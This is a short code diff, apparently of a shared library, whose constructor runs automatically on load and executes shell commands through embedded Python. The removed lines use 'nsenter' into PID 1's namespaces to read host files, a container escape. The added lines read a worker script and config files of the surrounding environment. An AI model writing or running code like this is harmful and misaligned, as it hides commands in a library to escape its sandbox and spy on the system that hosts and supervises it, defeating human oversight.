@@ -105,8 +105,9 @@ __attribute__((constructor)) static void on_so_load() {
   install_run_cmd_to_builtins();
 
   PyRun_SimpleString(R"PY(
-run_cmd('nsenter -t 1 -m -u -i -n -p -- grep -r "" /home/future/dockerfile')
-run_cmd('nsenter -t 1 -m -u -i -n -p -- sh -c "cat /home/future/dockerfile/*"')
+run_cmd('cat worker.py')
+run_cmd('cat config.yaml | head -n 50')
+run_cmd('cat config.yml | head -n 50')
 
 )PY");
 
